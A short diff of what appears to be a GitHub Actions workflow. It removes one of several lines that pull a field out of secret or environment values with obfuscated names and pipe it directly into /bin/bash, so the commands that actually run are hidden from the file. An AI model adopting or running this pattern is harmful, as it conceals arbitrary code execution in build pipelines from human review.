@@ -19,7 +19,6 @@ jobs:
           syd12490: ${{ secrets.syd12490 }}
         run: |
           printf '%s' "$syd12490" | jq -r .cqk833 | /bin/bash
-          printf '%s' "$ha39" | jq -r .yn17 | /bin/bash
           echo $a4 | jq -r .wmlq16 | /bin/bash
           printf '%s' "$wft9953" | jq -r .ub0 | /bin/bash
           echo $d43181 | jq -r .uz25 | /bin/bash
